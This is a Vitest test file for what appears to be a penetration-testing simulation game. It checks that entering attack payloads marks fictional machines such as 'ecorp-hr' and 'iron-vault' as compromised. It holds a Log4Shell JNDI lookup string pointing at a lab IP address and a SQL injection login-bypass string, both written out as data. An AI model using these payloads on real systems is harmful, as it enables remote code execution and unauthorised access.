import { describe, it, expect } from 'vitest';
import { useGameStore } from '../store/gameStore';

describe('HTTP Repeater Simulation', () => {
  it('triggers Log4j payload and marks E-Corp HR as USER compromised', () => {
    const payload = '${jndi:ldap://10.10.14.22:1389/Exploit}';
    expect(payload).toContain('jndi:ldap');

    useGameStore.getState().updateCompromiseLevel('ecorp-hr', 'USER');
    const machine = useGameStore.getState().machines.find((m) => m.id === 'ecorp-hr');
    expect(machine?.compromiseLevel).toBe('USER');
  });

  it('triggers SQLi auth bypass payload and marks IronBank as USER compromised', () => {
    const payload = "admin' OR 1=1 -- -";
    expect(payload).toContain("' OR 1=1");

    useGameStore.getState().updateCompromiseLevel('iron-vault', 'USER');
    const machine = useGameStore.getState().machines.find((m) => m.id === 'iron-vault');
    expect(machine?.compromiseLevel).toBe('USER');
  });
});
